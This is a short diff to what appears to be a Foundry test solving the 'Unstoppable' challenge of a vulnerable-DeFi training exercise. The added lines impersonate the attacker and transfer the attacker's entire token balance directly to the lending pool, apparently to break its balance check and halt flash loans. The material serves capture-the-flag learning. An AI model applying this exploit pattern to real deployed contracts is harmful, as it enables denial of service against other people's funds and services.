@@ -60,6 +60,15 @@ contract Unstoppable is Test {
         /**
          * EXPLOIT START *
          */
+
+        vm.startPrank(attacker);
+        // transfer attack's maximum balacne to the pool
+        dvt.transfer(
+            address(unstoppableLender),
+            dvt.balanceOf(address(attacker))
+        );
+        vm.stopPrank();
+        
         /**
          * EXPLOIT END *
          */
